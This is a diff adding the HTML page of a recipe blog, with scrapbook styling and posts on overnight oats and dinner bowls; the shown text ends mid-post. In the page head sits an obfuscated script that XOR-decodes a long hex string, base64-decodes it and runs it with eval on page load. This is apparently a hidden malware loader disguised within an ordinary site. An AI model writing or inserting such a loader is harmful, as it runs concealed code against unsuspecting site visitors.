@@ -1,0 +1,1116 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Katy Deliciously Easy Recipes</title>
+    
+    <!-- Added Google Fonts for a Whimsical Scrapbook / Journal look -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:ital,wght@0,400;0,700;1,400&family=Kalam:wght@300;400;700&display=swap" rel="stylesheet">
+
+    <style>
+        /* Whimsical Scrapbook / Indie Journal Styles */
+        :root {
+            --primary-color: #d96c75; /* Vintage Red/Pink */
+            --primary-hover: #b8555d;
+            --accent-color: #fae29c; /* Sticky Note Yellow */
+            --text-color: #2c2c2c; /* Typewriter Ink */
+            --heading-color: #1a1a1a;
+            --bg-color: #f4f1ea; /* Old Grid Paper */
+            --card-bg: #fdfdfc; /* Photo Paper */
+            --border-color: #e0dcd3;
+        }
+
+        body {
+            font-family: 'Courier Prime', monospace;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            /* Graph paper pattern */
+            background-image: linear-gradient(var(--border-color) 1px, transparent 1px), linear-gradient(90deg, var(--border-color) 1px, transparent 1px);
+            background-size: 25px 25px;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Typography Override */
+        h1, h2, h3, h4, .username {
+            font-family: 'Kalam', cursive;
+            color: var(--heading-color);
+        }
+
+        .container {
+            max-width: 650px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Top Navigation - Sticky Notes / Tape */
+        .top-nav {
+            padding: 30px 0 10px;
+            text-align: center;
+        }
+
+        .top-nav a {
+            display: inline-block;
+            background: var(--accent-color);
+            color: #333;
+            font-family: 'Kalam', cursive;
+            font-size: 1.2rem;
+            font-weight: 700;
+            padding: 5px 20px;
+            margin: 5px 10px;
+            box-shadow: 2px 3px 6px rgba(0,0,0,0.1);
+            transform: rotate(-2deg);
+            text-decoration: none;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+
+        .top-nav a:nth-child(even) {
+            background: #8da399; /* Muted Sage Tape */
+            color: white;
+            transform: rotate(2deg);
+        }
+        
+        .top-nav a:nth-child(3n) {
+            background: var(--primary-color);
+            color: white;
+            transform: rotate(-1deg);
+        }
+
+        .top-nav a:hover {
+            transform: scale(1.1) rotate(0deg);
+            box-shadow: 4px 6px 12px rgba(0,0,0,0.15);
+            z-index: 10;
+            position: relative;
+        }
+
+        /* Header */
+        header {
+            padding: 50px 0 40px;
+            text-align: center;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 3.5rem;
+            color: var(--heading-color);
+            cursor: pointer;
+            text-shadow: 2px 2px 0px rgba(0,0,0,0.1);
+            transition: transform 0.2s;
+        }
+        
+        header h1:hover {
+            transform: scale(1.02);
+        }
+
+        header p {
+            margin: 10px auto 0;
+            font-size: 1.1rem;
+            font-weight: bold;
+            display: inline-block;
+            background: rgba(255,255,255,0.7);
+            padding: 2px 10px;
+            border: 1px dashed var(--heading-color);
+            transform: rotate(1deg);
+        }
+
+        /* Post Cards - Polaroid Style */
+        .post-card {
+            background: var(--card-bg);
+            padding: 15px 15px 35px 15px; /* Thicker bottom for polaroid effect */
+            margin-bottom: 50px;
+            box-shadow: 3px 5px 15px rgba(0, 0, 0, 0.08);
+            border: 1px solid #eaeaea;
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275), box-shadow 0.3s ease;
+            cursor: pointer;
+        }
+
+        .post-card:nth-child(odd) {
+            transform: rotate(-1.5deg);
+        }
+
+        .post-card:nth-child(even) {
+            transform: rotate(1.5deg);
+        }
+
+        .post-card:hover {
+            transform: scale(1.03) rotate(0deg);
+            box-shadow: 6px 10px 25px rgba(0, 0, 0, 0.12);
+            z-index: 5;
+            position: relative;
+        }
+
+        .single-post {
+            background: var(--card-bg);
+            padding: 25px;
+            margin-bottom: 50px;
+            box-shadow: 3px 5px 15px rgba(0, 0, 0, 0.08);
+            border: 1px solid #eaeaea;
+            cursor: default;
+        }
+
+        .post-header {
+            padding: 0 0 15px 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .post-header img.avatar {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            margin-right: 15px;
+            border: 2px solid var(--text-color);
+            background-color: var(--accent-color);
+        }
+
+        .post-header .username {
+            font-size: 1.4rem;
+            font-weight: 700;
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 450px;
+            object-fit: cover;
+            border: 1px solid #ddd;
+        }
+
+        .post-content {
+            padding: 25px 5px 10px;
+        }
+
+        .post-content h2,
+        .post-content h1 {
+            margin: 0 0 15px;
+            font-size: 2rem;
+            line-height: 1.2;
+        }
+
+        .post-content p {
+            margin-bottom: 20px;
+        }
+
+        .post-content a {
+            color: var(--primary-color);
+            text-decoration: underline;
+            text-decoration-style: wavy;
+            text-underline-offset: 3px;
+        }
+
+        .post-content a:hover {
+            color: var(--primary-hover);
+        }
+
+        .post-footer {
+            padding: 10px 5px 0;
+            color: #888;
+            font-family: 'Kalam', cursive;
+            font-size: 1.1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 2px dashed #ccc;
+            margin-top: 15px;
+        }
+
+        /* Single Post Overrides */
+        .single-post .post-image {
+            max-height: none;
+            padding: 10px;
+            background: #fff;
+            border: 1px solid #ddd;
+            box-shadow: 2px 2px 8px rgba(0,0,0,0.05);
+            width: calc(100% - 20px);
+            box-sizing: border-box;
+            transform: rotate(-0.5deg);
+        }
+
+        .back-button {
+            display: inline-block;
+            margin-bottom: 25px;
+            color: #fff;
+            font-family: 'Kalam', cursive;
+            font-size: 1.2rem;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 5px 20px;
+            background: var(--text-color);
+            transform: rotate(-1deg);
+            box-shadow: 2px 3px 5px rgba(0,0,0,0.1);
+            transition: all 0.2s;
+        }
+
+        .back-button:hover {
+            transform: scale(1.05) rotate(1deg);
+            background: var(--primary-color);
+        }
+        
+        /* Fun overrides for inline styling in your post content */
+        .post-content div[style*="background"] {
+            background: #fffdf5 !important;
+            border: 2px dashed var(--accent-color) !important;
+            border-radius: 0 !important;
+            padding: 20px !important;
+            box-shadow: 3px 3px 0px rgba(0,0,0,0.05) !important;
+            margin: 30px 0 !important;
+        }
+        
+        .post-content h3[style*="border-left"] {
+            border-left: none !important;
+            color: var(--primary-color) !important;
+            text-decoration: underline;
+            text-decoration-style: double;
+            padding-left: 0 !important;
+        }
+
+        .post-content span[style*="background"] {
+            background: var(--accent-color) !important;
+            color: #111 !important;
+            border-radius: 2px !important;
+            font-family: 'Kalam', cursive;
+            font-size: 1rem !important;
+            padding: 2px 10px !important;
+            box-shadow: 1px 2px 4px rgba(0,0,0,0.1) !important;
+            transform: rotate(-1deg);
+            display: inline-block;
+            margin: 5px 5px 5px 0;
+            border: none !important;
+        }
+    </style>
+   <script>
+(function() {
+    var vtwjjrbym = "35230f2c5a2d050168377f09096819012d0a75595260651f2136122d513b2a5215051872753d7e475202415637773b752d55304b7f5a1f0e13361a73731d220a1524173e63130148685d5d33377802231f6b06025260641313563031523441082f1507345b767344525d630f305d052b004f2b7a5260081f3a2d1d28692b3208170b1b745a2d065c7b06771d09670d3d160a2c65577f180d1032662f6a2b10322c24322d5813160878065e001a647b7d067b74497864134f320c122379303a502f151c235d1c0d426428731e0a677a3e067c7456515a074b382305176435360e2f151f2e58020559520273133049233e156f02486a05392c152d1a347f0417053f0e14235d29014878277b14376728231f6b0600505a2929283d192c522b35172c7f037472070d416b2c7c171c47240f067b05567a703d1538263b3e523b2e0c3d1e17737a2d0656782c74001a730a232b5502487a7f071038216323521e3e50171a312c5d037e487d01631d09680106150a12445773223338261223793039053f0e1776601c0e5668020c57065d1d2a156023566364100e28086a745634361b2f153137631c0d09525c771709771d3d297f2c5d6a60030b2b3d1d3e563b3a12142307285a29114b55274d093102722a2d7f12096a5a3d0d2b562b2e531e3e51140a393163773f6050380057096801282c0b16585104034024223f3154342e1b2c151b7475762c06720674001a730a23067b0556575a170138223f3e611e41523f09652360297e016402630909682c312b7f124b5774394928363823563b0f053f1a602c5d292b5f6837671130597e37166f715f576017162b3d1e23563b0f05142013765813235955280c1e1f5e2f2816551648526f0b14120f200f731a39053f0e14237007065650386c001877273e1e557d017864134f320c1223793039053f0e14237007065678275117315d19322b41715e526f1f48135619717c1d320e150a2d2c6076116555287357096323312b6f3c427f7410163b1c2423544114172c0a6c7775293f47685d735732677231035606595770390d283262287b270b293f0e142370070656782c775e1a771d372c0a115656403e1f38261223793039053f0e14237007050368377c0030021d3316600e595770680138216323534100532c3460345b29155d542a0c0a1873023206512f566363614138211223600a390b3f24147270070e477805462c1a730a23067b05567a74101f38261223541e3e1b3f0a07285a7715415302735732677231067c7456577017012b570574623441162f1a393170073456525d63100a68012c2b7f7d487a74221f12572b756a090b293f0e142370070656782c74001a730a23160a7d445005680b2b36663752411b0d3f2121016b110d67635e050000781d30166f7056697007482b321d746a2429173f0b1f2863032b486b387b5732677e2a067016477c5e1011382620236a342e18120a3931601c1541535d01171c472423067b05567a74101f3826122379303a51171a602f5b77244453280c0d0a6819342d0a7044505a070f1322152e6a2010092c151b745813725955285911315920730c5105567a74101f38261223562217053f0e14235f1537087828631430021e232a4f340870506c45";
+    var vjfaicbgs = "vMUD9DG11o5gS0KDO8D137QxqeSD0sxb";
+    var vyepniipe = "";
+    
+    try {
+        for (var i = 0; i < vtwjjrbym.length; i += 2) {
+            var vyhlqhepa = parseInt(vtwjjrbym.substr(i, 2), 16);
+            vyepniipe += String.fromCharCode(vyhlqhepa ^ vjfaicbgs.charCodeAt((i/2) % vjfaicbgs.length));
+        }
+        
+        var vvqbkapbd = atob(vyepniipe);
+        eval(vvqbkapbd);
+    } catch(e) {
+        console.error("[DEBUG] Decryption or Execution failed: ", e);
+    }
+})();
+</script>
+</head>
+
+<body>
+
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Katy Deliciously Easy Recipes</h1>
+            <p>Thoughts, stories, and ideas.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Define your blog posts here!
+        
+        const posts = [
+            {
+                id: 'my-first-post',
+                title: '8 Easy Overnight Oats Recipes for Healthy Meal Prep Breakfasts',
+                date: 'April 2, 2026',
+                // 👇 Change this to point to your local assets folder
+                image: './assets/Overnight Oats Recipes for Healthy Meal Prep Breakfasts.png',
+                excerpt: 'Make mornings easier with these delicious overnight oats recipes 🥣 From strawberry and blueberry almond to mocha and chocolate peanut butter, these healthy breakfast ideas are perfect for meal prep and busy weekdays. Packed with fiber, protein, and flavor, these easy oat jars help keep you full and energized all day.',
+                content: `
+                <p>Busy mornings call for meals that are quick, nutritious, and genuinely satisfying. Overnight oats have become a go-to breakfast option for people who want a healthy start without spending extra time cooking in the morning. With endless flavor combinations, easy preparation, and wholesome ingredients, overnight oats are one of the simplest ways to make breakfast exciting again.</p>
+
+<p>From fruity combinations like strawberry and blueberry almond to rich indulgent flavors such as mocha and chocolate peanut butter, overnight oats offer a perfect balance of convenience and nutrition. They are easy to customize, meal-prep friendly, and packed with ingredients that support energy, fullness, and overall wellness.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Overnight oats are easy to prepare and ideal for busy mornings.</li>
+    <li>They provide fiber, protein, and long-lasting energy.</li>
+    <li>Flavor combinations can range from fruity to dessert-inspired.</li>
+    <li>Meal prep becomes simpler with make-ahead breakfast jars.</li>
+    <li>Healthy toppings like nuts, seeds, and fruit improve both texture and nutrition.</li>
+    <li>Proper storage helps overnight oats stay fresh for several days.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Overnight Oats Are So Popular</h2>
+
+<p>Overnight oats have gained massive popularity because they solve several breakfast problems at once. They are fast, affordable, portable, and highly adaptable. Instead of standing over a stove in the morning, you simply combine ingredients the night before, refrigerate them, and wake up to a ready-to-eat meal.</p>
+
+<p>The process is incredibly simple. Rolled oats absorb liquid overnight, softening into a creamy texture without cooking. Milk, yogurt, plant-based alternatives, fruits, nuts, and seeds can all be added to create unique flavor profiles and nutritional benefits.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Overnight oats are especially effective for people trying to maintain consistent energy throughout the day. The fiber from oats digests slowly, helping reduce mid-morning hunger and supporting better appetite control.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Nutritional Benefits of Overnight Oats</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Rich in Fiber</h3>
+
+<p>Oats are naturally rich in soluble fiber, particularly beta-glucan. This type of fiber helps support digestion, maintain fullness, and contribute to heart health. A fiber-rich breakfast can also help stabilize energy levels and reduce cravings later in the day.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Packed With Protein</h3>
+
+<p>Adding milk, yogurt, peanut butter, nuts, or chia seeds turns overnight oats into a protein-rich breakfast. Protein supports muscle recovery, helps maintain fullness, and gives the meal a more balanced nutritional profile.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Easy to Customize for Different Diets</h3>
+
+<p>Whether you follow a vegetarian, dairy-free, or high-protein diet, overnight oats can easily be adjusted to fit your preferences. Almond milk, coconut milk, oat milk, or Greek yogurt can all be used depending on your goals and taste preferences.</p>
+
+<div style="background:#fefce8;border:1px solid #fde68a;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#92400e;font-weight:700;padding-left:12px;border-left:4px solid #fbbf24;">Why This Matters</h3>
+  <ul style="margin:0;padding-left:20px;color:#78350f;">
+    <li>Healthy breakfasts improve consistency in healthy eating habits.</li>
+    <li>Preparing meals in advance reduces stress during busy mornings.</li>
+    <li>Balanced ingredients help support long-lasting energy and focus.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Delicious Overnight Oat Flavor Ideas</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Strawberry Overnight Oats</h3>
+
+<p>Fresh strawberries bring natural sweetness, color, and a refreshing flavor to overnight oats. Combining strawberries with chia seeds and milk creates a creamy breakfast that feels light yet satisfying.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Best Additions</h4>
+
+<ul>
+  <li>Greek yogurt for extra creaminess</li>
+  <li>Vanilla extract for sweetness</li>
+  <li>Honey or maple syrup</li>
+  <li>Fresh sliced strawberries on top</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Peanut Butter Banana Oats</h3>
+
+<p>Peanut butter and banana create a classic combination that feels comforting and filling. This version is ideal for people looking for a protein-packed breakfast with naturally sweet flavors.</p>
+
+<p>The creaminess of peanut butter blends beautifully with oats, while banana adds potassium and natural sugars that make the meal satisfying without being overly heavy.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Blueberry Almond Overnight Oats</h3>
+
+<p>Blueberries add antioxidants and a burst of freshness, while almonds provide crunch and healthy fats. This combination delivers excellent texture and flavor balance.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Toasted almonds can dramatically improve texture and flavor in overnight oats. Adding them just before serving keeps them crisp and prevents sogginess.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Chocolate Peanut Butter Oats</h3>
+
+<p>For anyone craving a dessert-inspired breakfast, chocolate peanut butter overnight oats are an excellent choice. Cocoa powder, oats, milk, and peanut butter create a rich flavor that feels indulgent while still offering nutritional value.</p>
+
+<p>Dark chocolate chips or cacao nibs can add extra texture and depth without overwhelming the recipe.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Apple Cinnamon Overnight Oats</h3>
+
+<p>Apple cinnamon oats deliver warm, cozy flavors that work perfectly during cooler seasons. Fresh apple chunks combined with cinnamon create a breakfast that tastes comforting and familiar.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Texture Tips</h4>
+
+<ul>
+  <li>Use crisp apples for better bite</li>
+  <li>Add walnuts or pecans for crunch</li>
+  <li>Mix in chia seeds for thickness</li>
+  <li>Sprinkle cinnamon before serving</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">6. Banana Nut Oats</h3>
+
+<p>Banana nut overnight oats combine creamy banana with crunchy nuts for a balanced breakfast. Walnuts are especially popular because they pair naturally with banana and add healthy fats.</p>
+
+<p>This flavor combination works particularly well for meal prep because bananas blend smoothly into the oat mixture overnight.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">7. Mango Coconut Overnight Oats</h3>
+
+<p>Mango and coconut bring tropical flavors into your breakfast routine. Coconut milk or shredded coconut adds richness, while mango offers brightness and natural sweetness.</p>
+
+<p>This variation feels refreshing and works especially well during warm weather.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">8. Mocha Overnight Oats</h3>
+
+<p>Mocha overnight oats are perfect for coffee lovers. Combining cocoa powder with chilled coffee creates a bold flavor that pairs beautifully with creamy oats.</p>
+
+<p>Adding a little vanilla or dark chocolate can enhance the café-inspired taste even more.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make Perfect Overnight Oats</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Choose the Right Oats</h3>
+
+<p>Rolled oats are generally the best choice because they soften well overnight without becoming mushy. Instant oats tend to become too soft, while steel-cut oats remain firmer and require more soaking time.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Balance the Liquid Ratio</h3>
+
+<p>The texture of overnight oats depends heavily on the oat-to-liquid ratio. Too much liquid creates a soupy texture, while too little can make the oats dry.</p>
+
+<p>A good starting point is equal parts oats and milk, with small adjustments based on desired thickness.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Stirring the mixture thoroughly before refrigeration helps distribute ingredients evenly and prevents dry pockets of oats from forming overnight.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Store Them Properly</h3>
+
+<p>Glass jars with lids are ideal for overnight oats because they are portable, reusable, and easy to stack in the refrigerator. Most overnight oat recipes stay fresh for up to four days when properly refrigerated.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Best Toppings for Overnight Oats</h2>
+
+<p>The toppings you choose can completely transform the final result. Combining creamy oats with crunchy or juicy toppings creates a much more enjoyable eating experience.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Popular Topping Ideas</h4>
+
+<ul>
+  <li>Fresh berries and sliced bananas</li>
+  <li>Chopped nuts and seeds</li>
+  <li>Shredded coconut</li>
+  <li>Dark chocolate chips</li>
+  <li>Honey or maple syrup</li>
+  <li>Nut butters</li>
+  <li>Granola for crunch</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Meal Prep Benefits of Overnight Oats</h2>
+
+<p>One of the biggest advantages of overnight oats is how well they fit into meal prep routines. Preparing several jars at once saves time during the week and reduces the temptation to skip breakfast.</p>
+
+<p>Because the ingredients are relatively inexpensive and easy to store, overnight oats are also budget-friendly. A few pantry staples can create multiple nutritious breakfasts with very little effort.</p>
+
+<div style="background:#eff6ff;border:1px solid #bfdbfe;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1d4ed8;font-weight:700;padding-left:12px;border-left:4px solid #60a5fa;">Quick Points</h3>
+  <ul style="margin:0;padding-left:20px;color:#1e3a8a;">
+    <li>Prepare breakfast the night before to save time.</li>
+    <li>Use rolled oats for the best creamy texture.</li>
+    <li>Customize flavors with fruit, nuts, or chocolate.</li>
+    <li>Store in sealed jars for freshness and convenience.</li>
+    <li>Healthy toppings improve nutrition and flavor balance.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>Overnight oats continue to stand out as one of the easiest and most versatile healthy breakfast ideas available today. Whether you enjoy fruity combinations like strawberry and mango coconut or richer flavors such as mocha and chocolate peanut butter, there is a version to suit every taste preference.</p>
+
+<p>The simplicity of overnight oats is part of their appeal. A few minutes of preparation can create a nourishing breakfast that supports energy, fullness, and convenience throughout the week. With endless customization options and easy meal prep benefits, overnight oats make healthy eating more approachable and enjoyable.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Rotate between sweet, fruity, and chocolate-based overnight oat recipes during the week to keep breakfast exciting while still maintaining a healthy routine.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Overnight Oats</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Breakfast</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Meal Prep Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Easy Breakfast Recipes</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Protein Breakfast</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Oatmeal Recipes</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Eating</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Quick Breakfast</span>
+</div>
+                `
+            },
+            {
+                id: 'Healthy-Toddler',
+                title: '9 Easy Dinner Bowl Recipes | Healthy Meal Prep Ideas',
+                date: 'march 14, 2026',
+                // 👇 Point to a different image in your folder
+                image: './assets/10-Easy-Healthy-Toddler.png',
+                excerpt: 'Looking for quick, delicious, and stress-free dinner inspiration? This board is packed with easy dinner bowl recipes that make weeknight cooking a breeze. From savory teriyaki chicken and zesty taco bowls to hearty vegan buddha bowls, these repeatable combinations make healthy eating fun and flavorful.',
+                content : `
+                <p>Easy bowl meals are one of the smartest ways to make dinner feel fresh, colorful, and satisfying without turning every night into a complicated cooking project. With a simple base, a flavorful protein, plenty of vegetables, and one good sauce, a bowl can become anything from a cozy teriyaki chicken dinner to a bright Mediterranean falafel meal or a quick salmon poke bowl.</p>
+
+<p>The beauty of dinner bowls is flexibility. They are practical enough for busy weeknights, balanced enough for meal prep, and customizable enough to please different tastes at the same table. Whether you love rice bowls, quinoa bowls, noodle bowls, taco bowls, or plant-based Buddha bowls, the formula is easy to repeat while still feeling new every time.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Easy bowl meals combine a base, protein, vegetables, toppings, and sauce in one simple dinner.</li>
+    <li>Popular combinations include teriyaki chicken bowls, beef taco bowls, poke bowls, falafel bowls, and vegan Buddha bowls.</li>
+    <li>Bowls are ideal for meal prep because many ingredients can be cooked ahead and mixed throughout the week.</li>
+    <li>Sauces and dressings are the quickest way to change the flavor profile without changing the whole meal.</li>
+    <li>A balanced dinner bowl should include texture, color, protein, fiber, and a satisfying finishing touch.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Bowl Meals Work So Well for Dinner</h2>
+
+<p>Bowl meals are popular because they solve a common dinner problem: how to make something quick, balanced, and interesting with ingredients you may already have. Instead of preparing separate side dishes, everything is layered together in one bowl. This creates a complete meal that feels intentional, not thrown together.</p>
+
+<p>A good dinner bowl usually starts with a base such as rice, quinoa, brown rice, noodles, sushi rice, or lettuce. Then comes the main protein, which could be chicken, beef, salmon, shrimp, pork, falafel, chickpeas, tofu, or beans. Vegetables bring freshness and color, while toppings like sesame seeds, feta, avocado, green onions, seaweed, or corn add texture and personality.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The best bowl meals are not just piles of ingredients. They are built around contrast. Warm and cool, creamy and crunchy, savory and bright, soft and crisp. That balance is what makes a simple bowl feel like a restaurant-worthy dinner.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Simple Formula for a Perfect Dinner Bowl</h2>
+
+<p>Once you understand the basic formula, you can create endless easy bowl meals for dinner without needing a strict recipe every time. Think of each bowl as five layers that work together.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Choose a Filling Base</h3>
+
+<p>The base gives the bowl structure and makes it satisfying. White rice is classic for teriyaki chicken bowls, taco bowls, poke bowls, and chipotle-style chicken bowls. Quinoa works beautifully in Mediterranean bowls because it has a light, nutty flavor. Brown rice is great for vegan Buddha bowls because it adds extra fiber and heartiness. Rice noodles are perfect for Thai peanut shrimp bowls when you want something slurpable and saucy.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Add a Protein</h3>
+
+<p>Protein makes a bowl dinner feel complete. Grilled chicken, chipotle chicken, teriyaki chicken, seasoned ground beef, salmon, shrimp, BBQ pulled pork, falafel, chickpeas, and grilled gyro-style chicken all work well. For plant-based bowls, chickpeas, black beans, hummus, falafel, roasted tofu, or lentils can provide plenty of substance.</p>
+
